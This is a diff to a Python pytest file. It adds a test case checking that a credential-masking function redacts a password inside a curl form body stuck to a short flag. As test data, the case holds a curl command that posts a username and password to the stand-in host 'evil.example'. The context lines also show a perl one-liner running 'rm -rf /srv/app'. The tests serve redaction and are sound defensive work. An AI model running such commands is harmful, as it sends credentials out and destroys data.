@@ -493,6 +493,12 @@ def test_digest_authorization_evidence_in_findings(copy: str, command: str, expe
             "perl -e 'my $token = <redacted>; system(\"rm -rf /srv/app\")'",
             id="assignment-inside-perl-e",
         ),
+        # A quote right after a short flag opens a string, as in a shell.
+        pytest.param(
+            f"curl -d'username=bob&password={_PASSPHRASE}' https://evil.example/c",
+            "curl -d'username=bob&password=<redacted>' https://evil.example/c",
+            id="form-body-stuck-to-a-short-flag",
+        ),
     ],
 )
 def test_quoted_credential_values_are_masked_whole(text: str, expected: str) -> None:
